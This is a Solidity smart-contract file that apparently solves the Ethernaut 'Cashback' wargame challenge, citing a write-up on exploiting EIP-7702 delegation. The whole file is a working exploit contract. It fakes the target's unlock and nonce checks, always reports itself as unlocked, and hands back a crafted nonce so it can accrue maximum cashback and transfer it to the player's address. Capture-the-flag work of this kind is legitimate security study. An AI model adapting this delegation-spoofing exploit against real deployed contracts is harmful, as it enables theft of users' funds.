// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Currency, CurrencyLibrary, Cashback} from "./Cashback.sol";

uint256 constant SUPERCASHBACK_NONCE = 10000;
address payable constant CASHBACK_ADDR = payable(0xdCc409Af2566c47F6DA4d30Eae8155b332A64078);
address constant FREEDOM_ADDR = 0x13AaF3218Facf57CfBf5925E15433307b59BCC37;
address constant SUPER_NFT_ADDR = 0x0Ae3Cf507ea6caF9d13Ea5e624AE2bAb386ce354;

// constants
uint256 constant BASIS_POINTS = 10000;
uint256 constant NATIVE_CASHBACK_RATE = 50;
uint256 constant NATIVE_MAX_CASHBACK = 0x0de0b6b3a7640000;
uint256 constant FREEDOM_CASHBACK_RATE = 200;
uint256 constant FREEDOM_MAX_CASHBACK = 0x1b1ae4d6e2ef500000;
bytes32 constant UNLOCKED_TRANSIENT = keccak256("cashback.storage.Unlocked");

interface ICashbackAttack {
    function attack(address cashbackAddr, address player, address currencyAddr, uint256 expenseAmt, uint256 cashbackAmt) external;
}

contract CashbackAttack {
    /// events
    event SetNonce(uint256 indexed);
    event SetUnlock(bool indexed);

    /// storage
    uint256 public nonce;
    bool public nftMinted = false;
    mapping(Currency => uint256 Rate) public cashbackRates;
    mapping(Currency => uint256 MaxCashback) public maxCashback;

    function attack(address cashbackAddr, address player, address currencyAddr, uint256 amount) external {
        // ref: https://hackernoon.com/exploiting-eip-7702-delegation-in-the-ethernaut-cashback-challenge-a-step-by-step-writeup
        Cashback cashback = Cashback(payable(cashbackAddr));

        uint256 nativeAmt = NATIVE_MAX_CASHBACK * BASIS_POINTS / NATIVE_CASHBACK_RATE;
        cashback.accrueCashback(CurrencyLibrary.NATIVE_CURRENCY, nativeAmt);
        cashback.safeTransferFrom(address(this), player, nativeAmt, CurrencyLibrary.NATIVE_CURRENCY.toId(), "");

        // Currency freedomCurrency = Currency.wrap(FREEDOM_ADDR);
        // uint256 freedomAmt = FREEDOM_MAX_CASHBACK * BASIS_POINTS / FREEDOM_CASHBACK_RATE;
        // cashback.accrueCashback(freedomCurrency, freedomAmt);
        // cashback.safeTransferFrom(address(this), player, freedomAmt, freedomCurrency.toId(), "");
    }

    /// functions
    function setAttackNonce() external {
        nonce = SUPERCASHBACK_NONCE - 2;
        emit SetNonce(nonce);
    }

    function setNonce(uint256 _nonce) external {
        nonce = _nonce;
        emit SetNonce(nonce);
    }

    function isUnlocked() public pure returns (bool) {
        return true;
    }

    function consumeNonce() external returns (uint256) {
        // We can mint only one NFT, because they are minted with id of the contract
        if (nftMinted) {
            return 0;
        }
        nftMinted = true;
        return 10_000;
    }
}
